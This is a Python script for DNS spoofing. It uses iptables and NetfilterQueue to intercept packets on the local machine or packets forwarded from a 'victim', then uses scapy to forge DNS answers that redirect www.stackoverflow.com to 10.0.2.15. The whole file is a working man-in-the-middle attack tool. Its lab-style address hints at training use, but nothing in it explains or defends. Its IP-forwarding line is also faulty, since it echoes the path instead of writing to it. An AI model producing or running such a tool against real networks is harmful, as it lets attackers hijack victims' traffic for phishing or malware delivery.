#!/usr/bin/env python


import netfilterqueue
import subprocess
import scapy.all as scapy
import optparse
import os


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="target, e.g victim/ local")
    # parser.add_option("-w", "--website", dest="website", help="website ,e.g www.stackoverflow.com")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Pls specify a target, use --help for more help")
    # elif not options.website:
    #     parser.error("[-] Pls specify a website, use --help for more help")
    return options


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname= scapy_packet[scapy.DNSQR].qname
        if "www.stackoverflow.com" in qname:
            print("[+] Spoofing target.")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()


# Testing the dns spoofing on the local machine
def starting_up_target(target):
    print("[+] Default chain packets are send through another interface")
    if target == "local":
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    elif target == "victim":
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    # "Enable ip forwarding as Kali might not be processing incoming and outgoing packet like a normal router do "
    subprocess.call(["echo", "1", "/proc/sys/net/ipv4/ip_forward"], stdout=open(os.devnull, 'wb'))


def queue_bind_run():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()


def iptables_flush():
    print("[+] flushing iptables!!")
    subprocess.call(["iptables", "--flush"])


options = get_arguments()


try:
    starting_up_target(options.target)
    queue_bind_run()

except KeyboardInterrupt:
    iptables_flush()
